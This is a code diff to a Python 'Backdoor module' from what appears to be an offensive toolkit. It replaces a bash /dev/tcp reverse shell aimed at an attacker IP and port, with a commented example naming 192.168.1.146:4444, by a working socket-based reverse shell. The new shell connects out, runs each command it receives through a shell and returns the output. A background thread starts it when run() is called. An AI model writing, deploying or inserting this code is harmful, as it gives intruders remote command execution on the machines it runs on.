@@ -2,72 +2,40 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
+import threading
+import socket
 import subprocess
-
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
 
-# run commands inside an opened shell
-def run_command(process, command):
-    process.stdin.write(command.encode())
-    process.stdin.flush()  # Ensure the command is sent
+def reverse_shell(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.sendall(b"Connected.\n")
 
-
-# Opens a backdoor with the attacker's machine
-def start_backdoor(atk_ip, atk_port):
-    if isinstance(atk_ip) == isinstance(None):
-        print("No IP address was provided for Backdoor module, exiting.")
-        return
-    else:
-        try:
-            # create shell
-            process = subprocess.Popen(
-                ["bash"],
-                stdin=subprocess.PIPE,
+        while True:
+            data = s.recv(1024).decode()
+            # close connexion when 'exit' is sent
+            if data.strip().lower() == "exit":
+                break
+            proc = subprocess.Popen(
+                data,
+                shell=True,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
             )
-            run_command(process, f"bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 \n")
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            s.send(stdout_value or b"No output\n")
 
-            # read output
-            while True:
-                output = process.stdout.readline()
-
-                # Check if the process has ended
-                if process.poll() is not None:
-                    print("Reverse shell closed")
-                    break
-
-                # Print output if the process is still running
-                if output:
-                    print(output.strip())
-
-            # close process
-            process.stdin.close()
-            process.terminate()
-            try:
-                process.wait(timeout=1)
-            except subprocess.TimeoutExpired:
-                process.kill()
-            is_root = True
-        except RuntimeError:
-            print("An error occured during exploitation...")
-    # sudo bash -i >& /dev/tcp/192.168.1.146/4444 0>&1
-
-    return
-
-
-# Closes the backdoor with the attacker's machine
-def stop_backdoor(attacker_ip=None):
-    if type(attacker_ip) == type(None):
-        return
-
-    # PLACE CODE HERE...
-
-    return
+    except Exception as e:
+        s.sendall(f"Error: {e}\n".encode())
+    finally:
+        s.close()
 
 
 ###########################################################################################################################
@@ -75,12 +43,12 @@ def stop_backdoor(attacker_ip=None):
 ###########################################################################################################################
 
 
-def run():
+def run(atk_ip: str, atk_port: int):
     success = False
     print("[+] Backdoor module activated!")
-    # code ...
+
+    thread = threading.Thread(target=reverse_shell, args=(atk_ip, atk_port))
+    thread.start()
+
     success = True
     return success
-
-
-# start_backdoor("", "4444")
